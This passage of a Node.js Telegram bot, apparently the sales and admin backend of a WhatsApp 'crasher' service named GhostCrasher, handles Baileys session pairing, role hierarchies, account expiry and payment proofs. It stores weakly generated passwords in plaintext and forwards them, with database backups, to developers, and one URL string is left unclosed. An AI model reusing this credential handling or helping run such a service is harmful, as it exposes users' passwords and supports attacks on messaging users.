      browser: ["Ubuntu", "Chrome", "20.0.04"],
      logger: pino({ level: "silent" }),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
    }
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('session', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const sessionRoot = path.join(__dirname, 'session');
  if (!fs.existsSync(sessionRoot)) return;

  const userFolders = fs.readdirSync(sessionRoot).filter(f => {
    return fs.lstatSync(path.join(sessionRoot, f)).isDirectory();
  });

  console.log(`[DEBUG] Found ${userFolders.length} subfolders inside session`);

  for (const userFolder of userFolders) {
    const userPath = path.join(sessionRoot, userFolder);
    const numberFolders = fs.readdirSync(userPath).filter(f => {
      return fs.lstatSync(path.join(userPath, f)).isDirectory();
    });

    for (const number of numberFolders) {
      const sessionPath = path.join(userPath, number);
      const credsPath = path.join(sessionPath, 'creds.json');

      if (!fs.existsSync(credsPath)) continue;
      if (activeConnections[number]) {
        console.log(`[SKIP] Session ${number} already active, skipping...`);
        continue;
      }

      console.log(`[START] Connecting session: ${number}`);
      connectSession(userPath, number).catch(err => {
        console.error(`[ERROR] Failed to start session ${number}:`, err.message);
      });
    }
  }
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('session', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  for (const [sessionName, sock] of Object.entries(activeConnections)) {
    if (sock && sock.user) {
      const sessionPath = path.join('session', subfolderName, sessionName);
      if (fs.existsSync(sessionPath)) {
        console.log(`✅ Found active session: ${sessionName}`);
        return sock;
      }
    }
  }

  for (const [sessionName, sock] of Object.entries(mess)) {
    if (sock && sock.user) {
      const sessionPath = path.join('session', subfolderName, sessionName);
      if (fs.existsSync(sessionPath)) {
        console.log(`✅ Found active mess session: ${sessionName}`);
        return sock;
      }
    }
  }

  for (const [sessionName, sock] of Object.entries(biz)) {
    if (sock && sock.user) {
      const sessionPath = path.join('session', subfolderName, sessionName);
      if (fs.existsSync(sessionPath)) {
        console.log(`✅ Found active biz session: ${sessionName}`);
        return sock;
      }
    }
  }

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");

    if (activeConnections[sessionName]) {
      console.log(`✅ Found fallback session: ${sessionName}`);
      return activeConnections[sessionName];
    }
    if (mess[sessionName]) {
      console.log(`✅ Found fallback mess: ${sessionName}`);
      return mess[sessionName];
    }
    if (biz[sessionName]) {
      console.log(`✅ Found fallback biz: ${sessionName}`);
      return biz[sessionName];
    }
  }

  console.log(`⚠️ No active session found for ${subfolderName}`);
  return null;
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

async function handleUserManagement(msg, input, type, action) {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (type === "premium" && !isOwner(userId) && !isAdmin(userId) && !isDeveloper(userId) && !isStaff(userId) && !isModerator(userId))
        return bot.sendMessage(chatId, "❌ Only owner/admin/moderator/staff/developer can manage PREMIUM!");

    if (type === "owner" && !isModerator(userId) && !isStaff(userId) && !isDeveloper(userId))
        return bot.sendMessage(chatId, "❌ Only moderator/staff/developer!");

    if (type === "admin" && !isOwner(userId) && !isModerator(userId) && !isStaff(userId) && !isDeveloper(userId))
        return bot.sendMessage(chatId, "❌ Only owner/moderator/staff/developer!");

    if (type === "reseller" && !isOwner(userId) && !isAdmin(userId) && !isModerator(userId) && !isStaff(userId) && !isDeveloper(userId))
        return bot.sendMessage(chatId, "❌ No permission!");

    if (type === "moderator" && !isStaff(userId) && !isDeveloper(userId))
        return bot.sendMessage(chatId, "❌ Only developer & staff can manage moderator!");

    if (type === "staff" && !isDeveloper(userId))
        return bot.sendMessage(chatId, "❌ Only developer can manage staff!");

    let targetUser = null;
    let fullName = "";

    if (msg.reply_to_message) {
        targetUser = msg.reply_to_message.from.id;
        fullName = `${msg.reply_to_message.from.first_name || ""} ${msg.reply_to_message.from.last_name || ""}`.trim();
    }

    else if (input && input.startsWith("@")) {
        const username = input.replace("@", "");

        try {
            const members = await bot.getChatAdministrators(chatId).catch(() => []);
            const found = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase());

            if (!found) return bot.sendMessage(chatId, "❌ Username tidak ditemukan!");

            targetUser = found.user.id;
            fullName = `${found.user.first_name || ""} ${found.user.last_name || ""}`.trim();
        } catch {
            return bot.sendMessage(chatId, "❌ Tidak dapat membaca username!");
        }
    }

    else if (input && !isNaN(input)) {
        targetUser = Number(input);

        try {
            const member = await bot.getChatMember(chatId, targetUser);
            fullName = `${member.user.first_name || ""} ${member.user.last_name || ""}`.trim();
        } catch {
            fullName = targetUser.toString();
        }
    }

    else {
        return bot.sendMessage(chatId, "❌ Gunakan reply / command @username / ID!");
    }

    if (!targetUser) return;
    if (!fullName) fullName = targetUser.toString();

    const data = loadAdmins();

    const key =
        type === "staff" ? "staff" :
        type === "moderator" ? "moderators" :
        type === "owner" ? "owners" :
        type === "admin" ? "admins" :
        type === "reseller" ? "resellers" :
        type === "premium" ? "premium" : null;

    if (!key) return;

    if (!data[key]) data[key] = [];

    data[key] = data[key].map(x => Number(x));

    const isAdd = action.toLowerCase() === "add";
    const exists = data[key].includes(targetUser);

    if (isAdd && exists)
        return bot.sendMessage(chatId, `⚠ User itu sudah menjadi ${type}!`);

    if (!isAdd && !exists)
        return bot.sendMessage(chatId, `⚠ User itu bukan ${type}!`);

    if (isAdd) data[key].push(targetUser);
    else data[key] = data[key].filter(id => id !== targetUser);

    saveAdmins(data);

    await bot.sendMessage(
        chatId,
        `[${fullName}](tg://user?id=${targetUser}) berhasil ${isAdd ? "DITAMBAHKAN" : "DIHAPUS"} sebagai *${type.toUpperCase()}*`,
        { parse_mode: "Markdown", reply_to_message_id: msg.message_id }
    );

    try {
        for (const devId of DEVELOPER_IDS) {
            await bot.sendDocument(
                devId,
                "./database/admins.json",
                { caption: "📦 Backup admin.json (update terbaru)" }
            );
        }
    } catch (err) {
        console.error("Gagal mengirim backup ke developer:", err);
    }
}

const originalOnText = bot.onText.bind(bot);

bot.onText = (regex, callback) => {
    originalOnText(regex, async (msg, match) => {

        const userId = msg.from.id;

        try {
            let inGroup = false;

            for (const groupId of ID_GROUP) {
                const member = await bot.getChatMember(groupId, userId);
                if (["member","administrator","creator"].includes(member.status)) {
                    inGroup = true;
                    break;
                }
            }

            if (!inGroup) {
                return bot.sendMessage(
                    msg.chat.id,
                    "❌ Kamu bukan seller GhostCrasher!"
                );
            }

        } catch {
            return bot.sendMessage(
                msg.chat.id,
                "❌ Kamu bukan seller GhostCrasher!"
            );
        }

        callback(msg, match);
    });
};

bot.onText(/^\/(add|del)(owner|admin|staff|moderator|reseller|premium)(?:\s+(\S+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const action = match[1];
    const type = match[2];
    const input = match[3];
    await handleUserManagement(msg, input, type, action);
});

// ============================================================
// 🔥 COMMAND /start — TEMA BARU
// ============================================================
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username || msg.from.first_name || "User";

  let menuText =
`<b>${boldFont('GhostCrasher Bot')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('Selamat datang')} @${username}
⌕  ${boldFont('Panel kontrol & manajemen akun')}
⚘  ${boldFont('Developers')}: @Danzotwdev
${THEME_SEP_LONG}

<b>${boldFont('MENU UTAMA')}</b>
${THEME_SEP_LONG}

〄 ${boldFont('/createuser')}  ·  Buat user baru
〄 ${boldFont('/cekakun')}  ·  Cek akun sendiri
〄 ${boldFont('/setexpire')}  ·  Tambah expired
〄 ${boldFont('/listuser')}  ·  Daftar semua user
〄 ${boldFont('/deleteuser')}  ·  Hapus user
〄 ${boldFont('/cek')}  ·  Cek status diri
〄 ${boldFont('/ban')}  ·  Ban user (staff)

${THEME_SEP_LONG}
<b>${boldFont('MANAGE ROLE')}</b>
${THEME_SEP_LONG}

〄 ${boldFont('/addpremium')}   ·  ${boldFont('/delpremium')}
〄 ${boldFont('/addreseller')}  ·  ${boldFont('/delreseller')}
〄 ${boldFont('/addowner')}     ·  ${boldFont('/delowner')}
〄 ${boldFont('/addmoderator')} ·  ${boldFont('/delmoderator')}
〄 ${boldFont('/addstaff')}     ·  ${boldFont('/delstaff')}
〄 ${boldFont('/addadmin')}     ·  ${boldFont('/deladmin')}

${THEME_SEP_LONG}
๑  Powered by ${boldFont('DEATH LUFFY')}  ·  @Danzotwdev`;

  const opts = {
    caption: truncateCaption(menuText, 1024),
    reply_to_message_id: msg.message_id,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
         [{ text: '〄  ℹ️ Info DEATH LUFFY 〄', url: 'https://t.me/+qbdLAs_pAoxmNjQ1 }]
      ]
    }
  };

  await bot.sendAnimation(chatId, 'https://files.catbox.moe/1z11gd.mp4', opts);
});
// ============================================================

bot.onText(/^\/deleteuser(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const deleterId = msg.from.id;
    const deleterRole = getUserStatus(deleterId);

    const username = match[1].trim();
    const users = loadDatabase();
    const userToDelete = users.find(u => u.username === username);

    if (!userToDelete) {
        return bot.sendMessage(chatId, `❌ User *${username}* tidak ditemukan!`, { parse_mode: "Markdown" });
    }

    let deletedUser = userToDelete;

    if (["Developer", "Staff", "Moderator", "Owner", "Admin", "Reseller"].includes(deleterRole)) {

        const updated = users.filter(u => u.username !== username);
        saveDatabase(updated);

        sendDeleteNotif(deletedUser, deleterId);

        return bot.sendMessage(chatId, `🗑 User *${username}* berhasil dihapus!`, {
            parse_mode: "Markdown"
        });
    }

    if (deleterRole === "Premium") {

        const premiumCreate = loadPremiumCreate();

        if (!premiumCreate[deleterId] || premiumCreate[deleterId] <= 0) {
            return bot.sendMessage(chatId, "❌ Kamu tidak punya akses menghapus user ini!", {
                parse_mode: "Markdown"
            });
        }

        const updated = users.filter(u => u.username !== username);
        saveDatabase(updated);

        premiumCreate[deleterId] -= 1;
        if (premiumCreate[deleterId] < 0) premiumCreate[deleterId] = 0;
        savePremiumCreate(premiumCreate);

        sendDeleteNotif(deletedUser, deleterId);

        return bot.sendMessage(chatId, `🗑 User *${username}* berhasil dihapus!\nKamu bisa create user lagi.`, {
            parse_mode: "Markdown"
        });
    }

    return bot.sendMessage(chatId, "❌ Kamu tidak punya izin untuk menghapus user!", {
        parse_mode: "Markdown"
    });
});

// ============================================================
// 🔥 COMMAND /cek — TEMA BARU
// ============================================================
bot.onText(/^\/cek(?:\s+(\S+))?$/i, async (msg) => {

    let target = msg.from;

    if (msg.reply_to_message) {
        target = msg.reply_to_message.from;
    }

    const userId = target.id;
    const username = target.username || "-";
    const name = target.first_name || "User";

    const check = (val) => val ? "✔" : "✘";

    const owner = isOwner(userId);
    const admin = isAdmin(userId);
    const staff = isStaff(userId);
    const moderator = isModerator(userId);
    const reseller = isReseller(userId);
    const premium = isPremium(userId);

    const statusStaff = staff;
    const statusModerator = moderator || staff;
    const statusOwner = owner || moderator || staff;
    const statusAdmin = admin || owner || moderator || staff;
    const statusReseller = reseller || admin || owner || moderator || staff;
    const statusPremium = premium || reseller || admin || owner || moderator || staff;

    const teks =
`<b>${boldFont('CEK STATUS USER')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('Nama')}  : ${name}
〄  ${boldFont('ID')}  : <code>${userId}</code>
〄  ${boldFont('User')}  : @${username}
${THEME_SEP_LONG}

〄  ${boldFont('Premium')}     ${check(statusPremium)}
〄  ${boldFont('Reseller')}    ${check(statusReseller)}
〄  ${boldFont('Admin')}       ${check(statusAdmin)}
〄  ${boldFont('Owner')}       ${check(statusOwner)}
〄  ${boldFont('Moderator')}   ${check(statusModerator)}
〄  ${boldFont('Staff')}       ${check(statusStaff)}

${THEME_SEP_LONG}`;

    bot.sendMessage(msg.chat.id, teks, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: '〄  ℹ️ Info DEATH LUFFY 〄', url: 'https://t.me/+qbdLAs_pAoxmNjQ1' }]
            ]
        }
    });
});

// ============================================================
// 🔥 COMMAND /cekakun — TEMA BARU
// ============================================================
bot.onText(/^\/cekakun$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);

  const users = loadDatabase();

  const user = users.find(
    u => String(u.creatorId) === userId && u.type === "self"
  );

  if (!user) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu belum memiliki akun.\nGunakan /createuser untuk membuat akun."
    );
  }

  await bot.sendMessage(
    chatId,
`<b>${boldFont('DETAIL AKUN')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('Username')}  : <b>${user.username}</b>
〄  ${boldFont('Password')}  : <code>${user.password}</code>
〄  ${boldFont('Role')}      : <b>${user.role}</b>
〄  ${boldFont('Expired')}   : <b>${user.expiredDate}</b>
${THEME_SEP_LONG}`,
    {
      parse_mode: "HTML"
    }
  );
});

// =====================================================
// 🔥 COMMAND /ban - STAFF & DEVELOPER (MODIFIED)
// =====================================================
bot.onText(/^\/ban(?:\s+(\S+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isStaff(userId) && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya Staff & Developer yang bisa ban user!");
  }

  let targetId = null;
  let targetUsername = "";

  if (msg.reply_to_message) {
    targetId = msg.reply_to_message.from.id;
    targetUsername = msg.reply_to_message.from.username ||
                     msg.reply_to_message.from.first_name ||
                     targetId;
  }
  else if (match[1]) {
    const input = match[1].trim();

    if (input.startsWith("@")) {
      const username = input.replace("@", "");

      try {
        const admins = await bot.getChatAdministrators(chatId);
        const found = admins.find(m => m.user.username?.toLowerCase() === username.toLowerCase());
        if (found) {
          targetId = found.user.id;
          targetUsername = found.user.username || found.user.first_name;
        }
      } catch {}

      if (!targetId) {
        return bot.sendMessage(chatId, "❌ User tidak ditemukan! Gunakan ID atau reply pesan user.");
      }

    } else if (!isNaN(input)) {
      targetId = Number(input);
      targetUsername = input;
    } else {
      return bot.sendMessage(chatId, "❌ Format salah! Gunakan @username, ID, atau reply pesan user.");
    }
  }
  else {
    return bot.sendMessage(
      chatId,
      "Format:\n/ban @username\n/ban userid\nAtau reply pesan user lalu ketik /ban"
    );
  }

  if (!targetId) {
    return bot.sendMessage(chatId, "❌ User tidak ditemukan!");
  }

  if (targetId === userId) {
    return bot.sendMessage(chatId, "❌ Kamu gak bisa ban diri sendiri!");
  }

  const isTargetStaff = isStaff(targetId);
  const isTargetDeveloper = isDeveloper(targetId);

  if (isStaff(userId) && !isDeveloper(userId)) {
    if (isTargetStaff || isTargetDeveloper) {
      return bot.sendMessage(
        chatId,
        "❌ Staff tidak bisa ban Staff lain atau Developer!"
      );
    }
  }

  try {
    await bot.kickChatMember(chatId, targetId);
    await bot.unbanChatMember(chatId, targetId);
  } catch (err) {
    console.log(`❌ Gagal kick: ${err.message}`);
  }

  let admins = loadAdmins();
  let removedRoles = [];

  for (const [role, ids] of Object.entries(admins)) {
    if (ids.includes(targetId)) {
      admins[role] = admins[role].filter(id => id !== targetId);
      removedRoles.push(role);
    }
  }
  saveAdmins(admins);

  let db = loadDatabase();
  const userAccounts = db.filter(u => String(u.creatorId) === String(targetId));
  let deletedAccounts = [];
  let deletedUserData = [];

  if (userAccounts.length > 0) {
    for (const acc of userAccounts) {
      deletedAccounts.push(acc.username);
      deletedUserData.push(acc);
    }
    db = db.filter(u => String(u.creatorId) !== String(targetId));
    saveDatabase(db);
  }

  const bannedBy = msg.from.username || msg.from.first_name;
  const executorRole = isDeveloper(userId) ? "👑 DEVELOPER" : "⚙️ STAFF";
  const roleText = removedRoles.length > 0 ? `\n〄  ${boldFont('Role dihapus')} : ${removedRoles.join(", ")}` : "";
  const accText = deletedAccounts.length > 0 ? `\n〄  ${boldFont('Akun dihapus')} : ${deletedAccounts.join(", ")}` : "";

  await bot.sendMessage(
    chatId,
`<b>${boldFont('USER DIBANNED')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('User')}  : @${targetUsername} (<code>${targetId}</code>)
〄  ${boldFont('Oleh')}  : @${bannedBy} (${executorRole})${roleText}${accText}
〄  ${boldFont('Waktu')} : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
${THEME_SEP_LONG}`,
    { parse_mode: "HTML" }
  );

  for (const devId of DEVELOPER_IDS) {
    bot.sendMessage(devId,
`🔴 ${boldFont('USER BANNED')}
${THEME_SEP}
〄  @${targetUsername} (<code>${targetId}</code>)
〄  Oleh: @${bannedBy} (${executorRole})${roleText}${accText}
〄  ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`,
      { parse_mode: "HTML" }
    );

    if (deletedUserData.length > 0) {
      for (const user of deletedUserData) {
        bot.sendMessage(devId,
`🗑 ${boldFont('USER DELETED')}
${THEME_SEP}
〄  ${user.username}
〄  ${user.password || '******'}
〄  ${user.role || 'member'}
〄  ${user.expiredDate || 'N/A'}
〄  Creator: ${user.creatorId || 'N/A'}`,
          { parse_mode: "HTML" }
        );
      }
    }

    await bot.sendDocument(
      devId,
      "./database/database.json",
      { caption: "📦 Backup database.json (terbaru)" }
    );

    await bot.sendDocument(
      devId,
      "./database/admins.json",
      { caption: "📦 Backup admins.json (terbaru)" }
    );
  }
});

// ============================================================
// 🔥 COMMAND /setexpire — TEMA BARU
// ============================================================
bot.onText(/^\/setexpire(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const id = String(msg.from.id);

  if (
    !isReseller(id) &&
    !isAdmin(id) &&
    !isOwner(id) &&
    !isModerator(id) &&
    !isStaff(id) &&
    !isDeveloper(id)
  ) {
    return bot.sendMessage(chatId, "❌ Hanya Reseller/Admin/Owner/Moderator/Staff/Developer yang bisa mengubah expire.");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "Format:\n/setexpire username|hari");
  }

  const [username, addDays] = match[1].split("|");
  const days = parseInt(addDays);

  if (!username || isNaN(days) || days <= 0) {
    return bot.sendMessage(chatId, "❌ Format salah.\nContoh:\n/setexpire user123|30");
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username.trim());

  if (!user) {
    return bot.sendMessage(chatId, "❌ User tidak ditemukan.");
  }

  const current = new Date(user.expiredDate);
  current.setDate(current.getDate() + days);
  user.expiredDate = current.toISOString().split("T")[0];

  saveDatabase(db);

  bot.sendMessage(
    chatId,
`<b>${boldFont('EXPIRE DIPERPANJANG')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('Username')}  : ${username}
〄  ${boldFont('Expired Baru')}  : <b>${user.expiredDate}</b>
${THEME_SEP_LONG}`,
    { parse_mode: "HTML" }
  );
});

// =====================================================
// 🔥 FUNGSI CEK LEVEL ROLE UNTUK CREATE USER
// =====================================================
function getRoleLevel(role) {
  const levels = {
    'member': 0,
    'reseller': 1,
    'admin': 2,
    'owner': 3,
    'moderator': 4,
    'staff': 5,
    'developer': 6
  };
  return levels[role] ?? -1;
}

function getAvailableRolesForCreator(role) {
  const roleLevel = getRoleLevel(role);

  if (role === 'developer') {
    return ['member', 'reseller', 'admin', 'owner', 'moderator', 'staff'];
  }

  if (role === 'staff') {
    return ['member', 'reseller', 'admin', 'owner', 'moderator'];
  }

  if (role === 'moderator') {
    return ['member', 'reseller', 'admin', 'owner'];
  }

  if (role === 'owner') {
    return ['member', 'reseller', 'admin'];
  }

  if (role === 'admin') {
    return ['member', 'reseller'];
  }

  if (role === 'reseller') {
    return ['member'];
  }

  return [];
}

// =====================================================
// 🔥 COMMAND /createuser - DENGAN PILIHAN ROLE
// =====================================================
bot.onText(/^\/createuser(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);

  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ Tidak ada akses");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "Format:\n/createuser username|hari");
  }

  const [username, expiry] = match[1].split("|").map(x => x.trim());
  const expiryDays = parseInt(expiry);

  if (isNaN(expiryDays)) {
    return bot.sendMessage(chatId, "Expiry harus angka");
  }

  const expiryMs = expiryDays * 24 * 60 * 60 * 1000;
  const expiredAt = Date.now() + expiryMs;
  const expiredDate = new Date(expiredAt).toISOString().split("T")[0];

  const password = username + Math.floor(Math.random() * 1000);

  const users = loadDatabase();

  if (users.find(u => u.username === username)) {
    return bot.sendMessage(chatId, "Username sudah ada");
  }

  let creatorRole = 'member';
  if (isDeveloper(userId)) creatorRole = 'developer';
  else if (isStaff(userId)) creatorRole = 'staff';
  else if (isModerator(userId)) creatorRole = 'moderator';
  else if (isOwner(userId)) creatorRole = 'owner';
  else if (isAdmin(userId)) creatorRole = 'admin';
  else if (isReseller(userId)) creatorRole = 'reseller';

  const availableRoles = getAvailableRolesForCreator(creatorRole);

  if (availableRoles.length === 0) {
    return bot.sendMessage(chatId, "❌ Role kamu tidak bisa membuat akun!");
  }

  const roleButtons = availableRoles.map(role => {
    const label = role.charAt(0).toUpperCase() + role.slice(1);
    return [{
      text: `〄  ${boldFont(label)}`,
      callback_data: `create_${role}_${username}_${expiryDays}_${password}_${expiredDate}`
    }];
  });

  const selfButton = [[
    {
      text: "〄  " + boldFont("Create Untuk Diri Sendiri"),
      callback_data: `selfcreate_${username}_${expiryDays}_${password}_${expiredDate}`
    }
  ]];

  const allButtons = [...roleButtons, ...selfButton];

  await bot.sendMessage(
    chatId,
`<b>${boldFont('PILIH ROLE AKUN')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('Username')}   : ${username}
〄  ${boldFont('Expired')}    : ${expiryDays} hari
〄  ${boldFont('Berlaku')}    : ${new Date(expiredAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
〄  ${boldFont('Role Kamu')}  : <b>${creatorRole.toUpperCase()}</b>
${THEME_SEP_LONG}
⌕  ${boldFont('Pilih role untuk akun baru')}:`,
    {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: allButtons }
    }
  );
});

// =====================================================
// 🔥 COMMAND UPGRADE ROLE
// =====================================================
bot.onText(/^\/upgrade$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const username = msg.from.username || msg.from.first_name;

  const users = loadDatabase();
  const user = users.find(u => String(u.creatorId) === userId);

  if (!user) {
    return bot.sendMessage(
      chatId,
      `❌ Kamu belum memiliki akun!\nGunakan /createuser untuk membuat akun terlebih dahulu.`,
      { parse_mode: "Markdown" }
    );
  }

  const currentRole = user.role || 'member';

  let availableUpgrades = [];

  if (currentRole === 'member') {
    availableUpgrades.push({ key: 'member_to_reseller', label: 'Reseller', price: ROLE_PRICES.member_to_reseller.priceFormatted });
  }
  if (currentRole === 'reseller') {
    availableUpgrades.push({ key: 'reseller_to_admin', label: 'Admin', price: ROLE_PRICES.reseller_to_admin.priceFormatted });
  }
  if (currentRole === 'admin') {
    availableUpgrades.push({ key: 'admin_to_owner', label: 'Owner', price: ROLE_PRICES.admin_to_owner.priceFormatted });
  }
  if (currentRole === 'owner') {
    availableUpgrades.push({ key: 'owner_to_moderator', label: 'Moderator', price: ROLE_PRICES.owner_to_moderator.priceFormatted });
  }
  if (currentRole === 'moderator') {
    availableUpgrades.push({ key: 'moderator_to_staff', label: 'Staff', price: ROLE_PRICES.moderator_to_staff.priceFormatted });
  }
  if (currentRole === 'staff' || currentRole === 'developer') {
    return bot.sendMessage(
      chatId,
      `✅ Role kamu sudah tinggi, tidak ada upgrade lagi!`,
      { parse_mode: "Markdown" }
    );
  }

  if (availableUpgrades.length === 0) {
    return bot.sendMessage(
      chatId,
      `❌ Tidak ada upgrade yang tersedia untuk role *${currentRole.toUpperCase()}*`,
      { parse_mode: "Markdown" }
    );
  }

  const buttons = availableUpgrades.map(up => {
    return [{
      text: `⬆️  ${boldFont('Upgrade ke')} ${up.label}  ·  ${up.price}`,
      callback_data: `upgrade_${up.key}`
    }];
  });

  await bot.sendMessage(
    chatId,
`<b>${boldFont('UPGRADE ROLE')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('Username')}  : ${user.username}
〄  ${boldFont('Role Saat Ini')}  : <b>${currentRole.toUpperCase()}</b>
〄  ${boldFont('Expired')}  : ${user.expiredDate}
${THEME_SEP_LONG}
⌕  ${boldFont('Pilih Role Yang Ingin Diupgrade')}:`,
    {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: buttons }
    }
  );
});

// =====================================================
// 🔥 COMMAND UPGRADELIST (UNTUK DEVELOPER)
// =====================================================
bot.onText(/^\/upgradelist$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);

  if (!isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya Developer yang bisa melihat list upgrade!");
  }

  const requests = loadUpgradeRequests();
  const pendingRequests = requests.filter(r => r.status === 'pending');

  if (pendingRequests.length === 0) {
    return bot.sendMessage(
      chatId,
      `📭 Tidak ada request upgrade yang pending.`,
      { parse_mode: "Markdown" }
    );
  }

  for (const req of pendingRequests) {
    const buttons = [
      [
        { text: "✅  " + boldFont("Terima"), callback_data: `approve_upgrade_${req.id}` },
        { text: "❌  " + boldFont("Tolak"), callback_data: `reject_upgrade_${req.id}` }
      ]
    ];

    await bot.sendMessage(
      chatId,
`<b>${boldFont('REQUEST UPGRADE')} #${req.id}</b>
${THEME_SEP_LONG}
〄  ${boldFont('User')}         : @${req.username}
〄  ${boldFont('Role Saat Ini')}  : <b>${req.currentRole.toUpperCase()}</b>
〄  ${boldFont('Target Role')}   : <b>${req.targetRole.toUpperCase()}</b>
〄  ${boldFont('Harga')}         : ${req.priceFormatted}
〄  ${boldFont('Dibuat')}        : ${new Date(req.createdAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
${THEME_SEP_LONG}`,
      {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: buttons }
      }
    );
  }
});

// =====================================================
// 🔥 HANDLE BUKTI TRANSFER
// =====================================================
bot.on("photo", async (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);

  if (pendingCreate[userId]?.stage === "waiting_bukti_buyer") {
    const data = pendingCreate[userId];
    const buktiTransferBuyer = msg.photo[msg.photo.length - 1].file_id;
    const reqId = Date.now() + "_" + userId;

    const expiryHours = data.expiryDays * 24;
    const expiredAt = new Date(data.expiredDate).getTime();

    await bot.sendPhoto(ID_GROUP_KEDUA, buktiTransferBuyer, {
      caption:
`<b>${boldFont('STOR TRANSAKSI')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('Username')} : ${data.username}
〄  ${boldFont('Expired')} : ${data.expiryDays} Hari (${expiryHours} Jam)
〄  ${boldFont('Request')} : ${userId}
〄  ${boldFont('Berlaku')} : ${new Date(expiredAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
${THEME_SEP_LONG}
⚠️  ${boldFont('HANYA DEVELOPER YANG BISA TERIMA/TOLAK!')}`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "✅  " + boldFont("Terima"), callback_data: `acctrx_${reqId}` },
          { text: "❌  " + boldFont("Tolak"), callback_data: `tolaktrx_${reqId}` }
        ]]
      }
    });

    pendingTransaksi[reqId] = {
      username: data.username,
      expiryDays: data.expiryDays,
      expiredDate: data.expiredDate,
      password: data.password,
      role: "member",
      creatorId: userId,
      creatorUsername: msg.from.username || userId,
      buktiBuyer: buktiTransferBuyer
    };

    await bot.sendMessage(
      userId,
`✅ ${boldFont('Request Create Account Berhasil Dikirim')}
⏳ Mohon Ditunggu Konfirmasi Dari Developer`,
      { parse_mode: "HTML" }
    );

    delete pendingCreate[userId];
    return;
  }

  if (pendingCreate[userId]?.stage === "waiting_bukti_create_role") {
    const data = pendingCreate[userId];
    const buktiTransfer = msg.photo[msg.photo.length - 1].file_id;
    const reqId = Date.now() + "_" + userId + "_" + data.targetRole;

    const expiryHours = data.expiryDays * 24;
    const expiredAt = new Date(data.expiredDate).getTime();

    await bot.sendPhoto(ID_GROUP_KEDUA, buktiTransfer, {
      caption:
`<b>${boldFont('STOR CREATE AKUN')}</b>
${THEME_SEP_LONG}
〄  ${boldFont('Username')}     : ${data.username}
〄  ${boldFont('Role')}         : ${data.targetRole.toUpperCase()}
